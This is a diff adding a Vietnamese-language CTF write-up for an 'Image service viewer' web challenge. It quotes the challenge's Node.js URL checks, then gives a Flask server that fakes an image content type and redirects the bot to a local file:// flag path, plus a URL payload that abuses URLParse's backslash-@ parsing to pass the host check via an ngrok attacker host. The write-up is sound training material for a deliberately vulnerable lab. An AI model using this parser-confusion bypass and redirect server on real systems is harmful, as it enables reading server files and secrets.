@@ -61,4 +61,63 @@ vào hàm thực tế thì flag[-~0+-~5] <=> flag[6]
 (đồng thời các kí tự đó cũng nằm trong khoảng cho phép của hàm check nên ok)
 
 payloads exploit: https://github.com/loctf-just-for-fun/CTF-write-up/blob/main/Screenshot%20(710).png
+
 '''
+_______________________________________________________________________________________________Image service viewer________________________________________________
+
+chall: bypass check host của nodeJS dùng thư viện URLParse + check file extension và tạo 1 server , server sẽ redirect đến nơi file:// (nơi chứa flag)để lùa bot lấy flag
+
+phân tích source , ta có:
+
+const isValidProtocol = (s, protocols = ["http", "https"]) => {
+    try {
+        new URL(s);
+
+        const parsed = parse(s);
+        print(parsed.protocol);
+
+        // return parsed.protocol ? protocols.map((x) => x.toLowerCase() + ":").includes(parsed.protocol) : false;
+        return protocols.map((x) => x.toLowerCase() + ":").includes(parsed.protocol);
+    } catch (err) {
+        return false;
+    }
+}; # chống bypass kết nối đến file://
+
+const isValidHost = (url) => {
+    const parse = new URLParse(url);
+    // console.log(parse);
+    return parse.host === "i.ibb.co" ? true : false;
+}; # url phải đến từ "i.ibb.co" host
+
++ explain : gửi 1 đoạn url vô web (với điều kiện host phải là 'i.ibb.com') ,1 con bot kiểm tra extension của file phải là ảnh , nếu qua thì sẽ truy vấn đến url đấy và lấy file về
+
++ exploit
+1. setup server để nhận request xong r server này sẽ chuyển hướng đến nơi chứa flag
+
+from flask import Flask, redirect, Response
+
+app = Flask(__name__)
+
+@app.route("/<path:path>", methods=["HEAD"])
+def head_request(path):
+    resp = Response("")
+    resp.headers['Content-Type'] = 'image/fake'
+    return resp
+
+@app.route("/<path:path>", methods=["GET"])
+def get_request(path):
+    # return redirect(
+    # "file:///Users/conrad/ctf/tetct2022/web/image-services-viewer/tetctf2023/container/images-serv",
+    # code=302,
+    # )
+
+    return redirect("file:///usr/src/app/fl4gg_tetCTF#lol.jpg", code=302)
+2. bypass với payload
+
+http://96f8-100-53-180-110.ngrok.io\\@i.ibb.co/#b\\a.jpg
+
+trong đó '#' để bypass file extension (khi hàm check thì thấy có .jpg -> pass nhưng khi thực hiện thì thấy có # nên loại bỏ phần url sau đi => vẫn thực hiện được đầy đủ chức năng )
+khi sử dụng payload , nodejs với URLParse sẽ nhận diện url là i.ibb.co => qua đc hàm bypass trong khi bot nhận diện là 96f8-100-53-180-110.ngrok.io
+
+bot sẽ truy cập vào trong attacker host (..-110.ngrok.io)và attacker host sẽ redirect đến "file:///usr/src/app/fl4gg_tetCTF#lol.jpg" ==> lấy đc flag 
+
